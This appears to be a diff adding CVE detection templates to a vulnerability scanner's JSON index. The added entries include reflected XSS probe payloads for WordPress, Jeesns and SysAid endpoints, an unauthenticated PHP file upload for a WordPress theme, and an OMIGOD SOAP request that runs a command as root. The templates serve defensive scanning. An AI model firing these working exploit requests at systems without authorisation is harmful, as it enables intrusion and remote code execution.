@@ -7177,6 +7177,57 @@
       ]
     },
     {
+      "id": "CVE-2016-1000142",
+      "info": {
+        "author": "daffainfo",
+        "classification": {
+          "cve-id": "CVE-2016-1000142",
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "The MW Font Changer WordPress plugin was affected by an Unauthenticated Reflected Cross-Site Scripting (XSS) security vulnerability.",
+        "name": "MW Font Changer <= 4.2.5 - Unauthenticated Reflected Cross-Site Scripting (XSS)",
+        "reference": [
+          "https://wpscan.com/vulnerability/4ff5d65a-ba61-439d-ab7f-745a0648fccc",
+          "https://nvd.nist.gov/vuln/detail/CVE-2016-1000142"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2016,wordpress,wp-plugin,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/parsi-font/css.php?size=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2016-1000146",
       "info": {
         "author": "daffainfo",
@@ -21002,6 +21053,159 @@
       ]
     },
     {
+      "id": "CVE-2020-19282",
+      "info": {
+        "author": "pikpikcu",
+        "classification": {
+          "cve-id": "CVE-2020-19282",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "Reflected cross-site scripting (XSS) vulnerability in Jeesns 1.4.2 allows attackers to execute arbitrary web scripts or HTML via a crafted payload in the system error message's text field.",
+        "name": "Jeesns 1.4.2 XSS",
+        "reference": [
+          "https://github.com/zchuanzhao/jeesns/issues/11",
+          "https://nvd.nist.gov/vuln/detail/CVE-2020-19282"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2020,jeesns,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/error?msg=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-19283",
+      "info": {
+        "author": "pikpikcu",
+        "classification": {
+          "cve-id": "CVE-2020-19283",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "Reflected cross-site scripting (XSS) vulnerability in the /newVersion component of Jeesns 1.4.2 allows attackers to execute arbitrary web scripts or HTML.",
+        "name": "Jeesns newVersion Reflection XSS",
+        "reference": [
+          "https://github.com/zchuanzhao/jeesns/issues/10",
+          "https://nvd.nist.gov/vuln/detail/CVE-2020-19283"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2020,jeesns,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/newVersion?callback=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-19295",
+      "info": {
+        "author": "pikpikcu",
+        "classification": {
+          "cve-id": "CVE-2020-19295",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "Reflected cross-site scripting (XSS) vulnerability in Jeesns 1.4.2 allows attackers to execute arbitrary web scripts or HTML via a crafted payload in the system error message's text field.",
+        "name": "Jeesns Weibo Topic Reflection XSS",
+        "reference": [
+          "https://github.com/zchuanzhao/jeesns/issues/21",
+          "https://nvd.nist.gov/vuln/detail/CVE-2020-19295"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2020,jeesns,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/weibo/topic/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-1938",
       "info": {
         "author": "milo2012",
@@ -28299,6 +28503,50 @@
       ]
     },
     {
+      "id": "CVE-2021-24499",
+      "info": {
+        "author": "daffainfo",
+        "classification": {
+          "cve-id": "CVE-2021-24499",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "cvss-score": 9.8,
+          "cwe-id": "CWE-434"
+        },
+        "description": "The AJAX actions workreap_award_temp_file_uploader and workreap_temp_file_uploader did not perform nonce checks, or validate that the request is from a valid user in any other way. The endpoints allowed for uploading arbitrary files to the uploads/workreap-temp directory. Uploaded files were neither sanitized nor validated, allowing an unauthenticated visitor to upload executable code such as php scripts.",
+        "name": "Workreap WordPress theme - unauthenticated RCE",
+        "reference": [
+          "https://github.com/RyouYoo/CVE-2021-24499",
+          "https://nvd.nist.gov/vuln/detail/CVE-2021-24499"
+        ],
+        "severity": "critical",
+        "tags": "cve,cve2021,wordpress,wp-plugin,rce,intrusive"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "71abe5077dae2754c36d731cc1534d4d"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=------------------------cd0dc6bdc00b1cf9\nX-Requested-With: XMLHttpRequest\n\n-----------------------------cd0dc6bdc00b1cf9\nContent-Disposition: form-data; name=\"action\"\n\nworkreap_award_temp_file_uploader\n-----------------------------cd0dc6bdc00b1cf9\nContent-Disposition: form-data; name=\"award_img\"; filename=\"{{randstr}}.php\"\nContent-Type: application/x-httpd-php\n\n<?php echo md5(\"CVE-2021-24499\"); ?>\n-----------------------------cd0dc6bdc00b1cf9--\n",
+            "GET /wp-content/uploads/workreap-temp/{{randstr}}.php HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-25281",
       "info": {
         "author": "madrobot",
@@ -29939,6 +30187,57 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/?server=db&username=root&db=mysql&table=event%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-30049",
+      "info": {
+        "author": "daffainfo",
+        "classification": {
+          "cve-id": "CVE-2021-30049",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "SysAid 20.3.64 b14 is affected by Cross Site Scripting (XSS) via a /KeepAlive.jsp?stamp= URI.",
+        "name": "SysAid Technologies 20.3.64 b14 Reflected XSS",
+        "reference": [
+          "https://eh337.net/2021/03/30/sysaid/",
+          "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-30049"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2021,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/KeepAlive.jsp?stamp=16170297%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -31742,6 +32041,40 @@
             "{{BaseURL}}/crea_modelli.php?anno=2021&id_sessione=&fonte_dati_conn=attuali&T_PHPR_DB_TYPE=postgresql&T_PHPR_DB_NAME=%C2%9E%C3%A9e&T_PHPR_DB_HOST=localhost&T_PHPR_DB_PORT=5432&T_PHPR_DB_USER=%C2%9E%C3%A9e&T_PHPR_DB_PASS=%C2%9E%C3%A9e&T_PHPR_LOAD_EXT=NO&T_PHPR_TAB_PRE=%C2%9E%C3%A9e&anno_modello=2021&lingua_modello=en&cambia_frasi=SIipq85%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ef9xkbujgt24&form_availability_calendar_template=1"
           ],
           "stop-at-first-match": true
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-38647",
+      "info": {
+        "author": "daffainfo,xstp",
+        "description": "Open Management Infrastructure Remote Code Execution Vulnerability",
+        "name": "OMIGOD - Open Management Infrastructure RCE",
+        "reference": [
+          "https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure",
+          "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38647",
+          "https://attackerkb.com/topics/08O94gYdF1/cve-2021-38647",
+          "https://censys.io/blog/understanding-the-impact-of-omigod-cve-2021-38647/",
+          "https://github.com/microsoft/omi"
+        ],
+        "severity": "critical",
+        "tags": "cve,cve2021,rce,omi,microsoft"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "type": "word",
+              "words": [
+                "<p:StdOut>",
+                "uid=0(root) gid=0(root) groups=0"
+              ]
+            }
+          ],
+          "raw": [
+            "POST /wsman HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/soap+xml;charset=UTF-8\n\n<s:Envelope\n  xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\"\n  xmlns:a=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\"\n  xmlns:n=\"http://schemas.xmlsoap.org/ws/2004/09/enumeration\"\n  xmlns:w=\"http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd\"\n  xmlns:xsi=\"http://www.w3.org/2001/XMLSchema\"\n  xmlns:h=\"http://schemas.microsoft.com/wbem/wsman/1/windows/shell\"\n  xmlns:p=\"http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd\">\n  <s:Header>\n    <a:To>HTTP://{{Hostname}}/wsman/</a:To>\n    <w:ResourceURI s:mustUnderstand=\"true\">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>\n    <a:ReplyTo>\n      <a:Address s:mustUnderstand=\"true\">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n    </a:ReplyTo>\n    <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteScript</a:Action>\n    <w:MaxEnvelopeSize s:mustUnderstand=\"true\">102400</w:MaxEnvelopeSize>\n    <a:MessageID>uuid:00B60932-CC01-0005-0000-000000010000</a:MessageID>\n    <w:OperationTimeout>PT1M30S</w:OperationTimeout>\n    <w:Locale xml:lang=\"en-us\" s:mustUnderstand=\"false\"/>\n    <p:DataLocale xml:lang=\"en-us\" s:mustUnderstand=\"false\"/>\n    <w:OptionSet s:mustUnderstand=\"true\"/>\n    <w:SelectorSet>\n      <w:Selector Name=\"__cimnamespace\">root/scx</w:Selector>\n    </w:SelectorSet>\n  </s:Header>\n  <s:Body>\n    <p:ExecuteScript_INPUT\n      xmlns:p=\"http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem\">\n      <p:Script>aWQ=</p:Script>\n      <p:Arguments/>\n      <p:timeout>0</p:timeout>\n      <p:b64encoded>true</p:b64encoded>\n    </p:ExecuteScript_INPUT>\n  </s:Body>\n</s:Envelope>\n"
+          ]
         }
       ]
     },
